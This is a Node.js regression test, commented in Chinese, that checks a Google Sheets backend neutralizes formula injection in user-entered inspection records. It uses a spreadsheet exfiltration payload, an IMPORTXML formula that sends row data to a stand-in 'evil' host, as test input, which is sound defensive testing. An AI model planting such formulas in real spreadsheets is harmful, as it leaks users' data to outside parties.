// 回歸測試：使用者填的文字不可以變成 Google Sheet 的公式
//   appendRow／setValues 會把 = + - @ 開頭的字串當公式執行，備註填
//   =IMPORTXML("https://evil/?d="&A2,"//x") 就會把同列資料送到外部網址（資料外洩）。
//   對策：寫入前補一個單引號強制為文字；Sheet 讀回時不含這個單引號，資料本身不變。
// 執行方式：node backend/test/formulaInjection.test.js
const path = require('path');
const { loadGasFile } = require('./gas-fake-env');

const GS_PATH = path.join(__dirname, '..', '程式碼.gs');
let failed = 0;
function assertEqual(actual, expected, label) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  console.log((ok ? '✓' : '✗') + ' ' + label + (ok ? '' : `\n  預期: ${JSON.stringify(expected)}\n  實際: ${JSON.stringify(actual)}`));
  if (!ok) failed++;
}

const { ctx } = loadGasFile(GS_PATH);
ctx.ensureMonth('11508');

// ===== 1. 危險開頭要被中和 =====
assertEqual(ctx.safeCell_('=IMPORTXML("https://evil/?d="&A2,"//x")'), "'=IMPORTXML(\"https://evil/?d=\"&A2,\"//x\")", '= 開頭（資料外洩用的公式）');
assertEqual(ctx.safeCell_('+1+1'), "'+1+1", '+ 開頭');
assertEqual(ctx.safeCell_('-1+1'), "'-1+1", '- 開頭');
assertEqual(ctx.safeCell_('@SUM(A1)'), "'@SUM(A1)", '@ 開頭');

// ===== 2. 正常內容不可以被改動（改動了會讓報表出現多餘的單引號）=====
assertEqual(ctx.safeCell_('貨架凌亂'), '貨架凌亂', '一般中文原封不動');
assertEqual(ctx.safeCell_(''), '', '空字串');
assertEqual(ctx.safeCell_(90), 90, '數字不可被轉成字串（合計得分要能排序統計）');
assertEqual(ctx.safeCell_('90'), '90', '數字字串照舊');
assertEqual(ctx.safeCell_('A=B'), 'A=B', '等號在中間不算公式');

// ===== 3. 實際寫入路徑：submitRecord / updateRecord 都走 recordToRow =====
const rec = (id, note, storeName) => ({
  id: id, month: '11508', time: '2026-08-25 09:00', dept: '一部', section: '北一課',
  empId: 'A1', staffName: '測試員', storeCode: '000001', storeName: storeName, storeType: '可拍照',
  total: 90, grade: '合格', staffCount: '1', identity: '店長', note: note,
  detail: {}, observation: {}, photos: {}, paperPhotos: [],
});
const sh = ctx.ssBook().getSheetByName('點檢紀錄_11508');
const row = ctx.recordToRow(sh, rec('R1', '=IMPORTXML("https://evil/?d="&A2,"//x")', '=1+1'));
const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
assertEqual(row[head.indexOf('備註')].charAt(0), "'", '備註的公式被中和');
assertEqual(row[head.indexOf('店名')].charAt(0), "'", '自行新增店鋪的店名也會經過（同樣是使用者輸入）');
assertEqual(row[head.indexOf('合計得分')], 90, '分數仍是數字');

// 讀回時要看得到原本的字（Sheet 的單引號是格式標記不算內容，此處以去掉前綴模擬）
ctx.submitRecord(rec('R1', '=IMPORTXML("https://evil/?d="&A2,"//x")', 'A店'));
const back = ctx.queryRecords('11508', {}).find(r => r.id === 'R1');
assertEqual(String(back.note).replace(/^'/, ''), '=IMPORTXML("https://evil/?d="&A2,"//x")', '使用者原本打的字要完整保留，只是不執行');

// ===== 4. 異動紀錄也是寫入點（說明欄含使用者提供的值）=====
assertEqual(ctx.safeRow_(['2026-08-25', '=cmd', 'x', '', '-1']), ['2026-08-25', "'=cmd", 'x', '', "'-1"], '異動紀錄整列都要過濾');

console.log(failed === 0 ? '\n✅ 全部通過' : `\n❌ ${failed} 項失敗`);
process.exit(failed === 0 ? 0 : 1);
